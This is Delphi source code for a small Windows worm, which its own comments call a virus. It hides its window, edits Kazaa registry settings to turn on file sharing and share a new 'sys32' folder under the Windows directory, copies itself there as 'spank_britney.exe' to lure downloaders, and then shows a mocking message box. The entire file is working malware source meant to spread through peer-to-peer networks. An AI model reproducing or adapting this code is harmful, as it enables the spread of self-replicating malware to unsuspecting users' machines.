   unit Unit1;

   interface

   uses
     Windows, aclUtils, sClasses,  Forms, Dialogs, Registry;

   type
     TForm1 = class(TForm)
       procedure FormCreate(Sender: TObject);
     private
       { Private declarations }
     public
       { Public declarations }
     end;

   var
     Form1: TForm1;
     reg:Tregistry;
     PC:integer;
     rootstring:string;
     rootchar:array[0..79] of Char;
     sys32string:string;
     sys32char:array[0..79] of Char;
     fullstring:string;
     fullchar:array[0..79] of Char; //Windows directory + folder sys32
     spankchar:array[0..79] of Char;
     spankchar2:array[0..79] of Char;
     spankchar3:array[0..79] of Char;
     spankstring:string;
     spankstring2:string;
     spankstring3:string;
     spankstringFinal:string; // same as below but is in string
     spankcharfinal:array[0..79] of Char; // varible which holds where the virus should be copyed to. c:/windows/sys32/Spank_Britney.exe . has to be held in array or copyfile function won`t understand it
   implementation

   {$R *.dfm}
   function GetWindowsDir: string; // function to get the default windows directory.
   const
   (* The length of the directory buffer. Usually 64 or even 16 is enough:)
   **
   ** Must be DWORD type.
   *)
   dwLength: DWORD = 255;
   var
   pcWinDir: PChar;
   begin
   GetMem(pcWinDir, dwLength);
   GetWindowsDirectory(pcWinDir, dwLength);
   Result := string(pcWinDir);
   FreeMem(pcWinDir, dwLength);
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   var
      rootstring:string;
   begin

   SetWindowLong(Application.Handle, GWL_EXSTYLE, WS_EX_TOOLWINDOW);
   ShowWindow(Application.Handle, SW_HIDE);
     SetWindowLong(Application.Handle, GWL_EXSTYLE,
       GetWindowLong(Application.Handle, GWL_EXSTYLE)
       or WS_EX_TOOLWINDOW );
     Application.ShowMainForm := False; // Makes the form invisble

   reg := TRegistry.Create;
   reg.RootKey := HKEY_CURRENT_USER;
   if reg.OpenKey('Software\Kazaa\LocalContent',True) then
    reg.WriteString('DisableSharing','0');   // makes kazaa share files
   reg.writestring('dir99','012345:'+GetWindowsDir+'\sys32');  // makes kazaa share directory c:/windows/sys32
   rootstring:=getwindowsdir;

   strpcopy(rootchar, rootstring);
   sys32string:='/sys32/';
   strpcopy(sys32char, sys32string);
   fullstring:=rootchar+sys32char;
   strpcopy(fullchar, fullstring);

   CreateDirectory(fullchar,NIL);

   spankstring2:=fullstring;
   spankstring3:=spankstring2+'spank_britney.exe';
   spankstringFinal:=spankstring3;

   strpcopy(spankcharfinal, spankstringfinal);
   CopyFile(PChar(Application.ExeName),spankcharfinal,True);  //copys itself to c:/windows/sys32/spank_britney.exe

   begin

   MessageDlg('You are a DUMB ASS!! :) MWHAHAHAH', mtInformation, [mbOK], 0)



   end;
   end;
   end.
